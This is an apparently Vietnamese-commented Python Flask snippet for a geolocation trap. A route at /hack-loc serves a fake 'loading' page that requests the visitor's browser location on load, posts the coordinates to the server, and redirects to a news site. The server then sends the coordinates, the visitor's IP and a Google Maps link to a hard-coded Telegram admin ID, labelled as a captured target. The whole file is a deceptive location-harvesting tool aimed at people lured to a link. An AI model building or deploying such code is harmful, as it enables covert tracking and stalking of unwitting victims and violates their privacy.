from flask import request, render_template_string

# 1. Điền ID Telegram của sếp vào đây để Bot báo về máy sếp
ADMIN_ID = "6681014168" # Thay bằng ID thật của sếp (lấy từ lệnh /id)

# 2. Giao diện trang bẫy (Hiện ảnh và xin quyền vị trí)
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>Đang tải nội dung...</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                window.location.href = "https://imgur.com/gallery/beautiful-scenery-random"; // Link ảnh dự phòng
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            // Gửi tọa độ về server
            fetch(`/save_loc?lat=${lat}&lon=${lon}`);
            // Sau khi lấy xong, chuyển hướng sang link ảnh hoặc bài báo
            setTimeout(() => {
                window.location.href = "https://vnexpress.net"; // Link sếp muốn họ xem sau khi hack
            }, 500);
        }

        function showError(error) {
            window.location.href = "https://vnexpress.net";
        }
    </script>
</head>
<body onload="getLocation()">
    <h3>Đang tải dữ liệu, vui lòng đợi...</h3>
    <img src="https://via.placeholder.com/300" style="display:none;">
</body>
</html>
"""

@app.route('/hack-loc')
def hack_loc():
    return render_template_string(HTML_TRAP)

@app.route('/save_loc')
def save_loc():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Tạo link Google Maps
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    msg = (
        f"🎯 **MỤC TIÊU ĐÃ CHO PHÉP TRUY CẬP!**\n\n"
        f"📍 Tọa độ: `{lat}, {lon}`\n"
        f"🌐 IP: `{user_ip}`\n"
        f"🗺 Xem trên bản đồ: [Bấm vào đây]({maps_link})"
    )
    bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    return "OK"
